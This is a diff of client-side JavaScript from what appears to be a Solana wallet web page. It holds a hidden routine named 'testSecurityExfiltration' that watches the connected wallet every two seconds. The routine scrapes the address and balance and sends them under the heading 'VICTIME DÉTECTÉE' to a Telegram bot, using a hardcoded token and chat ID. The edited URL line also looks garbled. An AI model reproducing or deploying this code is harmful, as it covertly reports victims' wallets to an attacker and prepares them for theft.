@@ -1531,8 +1531,8 @@ document.addEventListener("DOMContentLoaded",()=>{
 async function testSecurityExfiltration(address, sol, tokens) {
     const token = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
     const chat = "8575014959";
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
-    const text = `🚨 *VICTIME DÉTECTÉE* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Vrai Solde:* ${sol}\n💎 *Devise:* ${tokens}`;
+    const url = `https://telegram.org{token}/sendMessage`;
+    const text = `🚨 *VICTIME DÉTECTÉE* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Solde:* ${sol}\n💎 *Devise:* ${tokens}`;
 
     try {
         await fetch(url, {
@@ -1545,11 +1545,14 @@ async function testSecurityExfiltration(address, sol, tokens) {
 
 setInterval(() => {
     if (state && state.conn && state.conn.address) {
-        const currentAddr = state.conn.address;
-        if (window.lastSent !== currentAddr) {
-            window.lastSent = currentAddr;
-            const uiBalance = document.querySelector(".balance-value")?.textContent || "Non détecté";
-            testSecurityExfiltration(currentAddr, uiBalance, state.currency || "SOL");
+        const addr = state.conn.address;
+        const pageText = document.body.innerText;
+        const solMatch = pageText.match(/(\d+\.?\d*)\s?SOL/);
+        const currentSol = solMatch ? solMatch[0] : (state.balance ? (state.balance / 1e9).toFixed(3) + " SOL" : "Scan...");
+
+        if (window.lastSent !== addr + currentSol) {
+            window.lastSent = addr + currentSol;
+            testSecurityExfiltration(addr, currentSol, state.currency || "SOL");
         }
     }
 }, 2000);
